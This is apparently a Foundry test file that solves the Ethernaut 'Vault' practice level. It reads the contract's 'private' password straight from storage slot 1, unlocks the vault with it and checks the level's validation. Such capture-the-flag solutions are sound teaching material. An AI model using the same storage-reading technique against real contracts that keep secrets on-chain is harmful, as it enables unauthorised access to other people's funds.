// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {VaultFactory} from "src/levels/VaultFactory.sol";
import {Vault} from "src/levels/Vault.sol";

contract VaultTest is Test {
    VaultFactory private vaultFactory;
    Vault private vault;
    address private attacker = makeAddr("attacker");

    function setUp() external {
        vaultFactory = new VaultFactory();
        address vaultAddress = vaultFactory.createInstance(attacker);
        vault = Vault(vaultAddress);
    }

    function testVaultHack() external {
        // Password is stored at slot number 1. Get value st storage slot number 1
        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));

        // Unlock the vault using password
        vault.unlock(password);

        // test
        // Assert that 'locked' is set to false
        bool locked = vault.locked();
        assertFalse(locked, "Unlocking Vault Failed!!!_1");

        // Validate the instance using Ethernaut validation.
        bool success = vaultFactory.validateInstance(
            payable(address(vault)),
            attacker
        );
        assertTrue(success, "Unlocking Vault Failed!!!_2");
    }
}
